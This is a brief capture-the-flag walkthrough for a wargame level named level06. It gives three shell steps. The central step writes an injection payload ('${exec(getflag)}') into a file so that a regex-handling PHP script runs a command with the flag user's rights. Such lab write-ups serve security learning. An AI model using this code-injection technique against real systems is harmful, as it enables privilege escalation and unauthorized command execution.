## Step 1
> ls -l ~

We saw two files ``level06`` and ``level06.php``. ``level06`` is executed by flag06.

## Step 2
> echo '/(\[x (.{${exec(getflag)}})\])' > /tmp/flag

After analyzing ``level06.php``, we were able to determine a possibility to use it and get the flag.

## Step 3
> ./level06 /tmp/flag
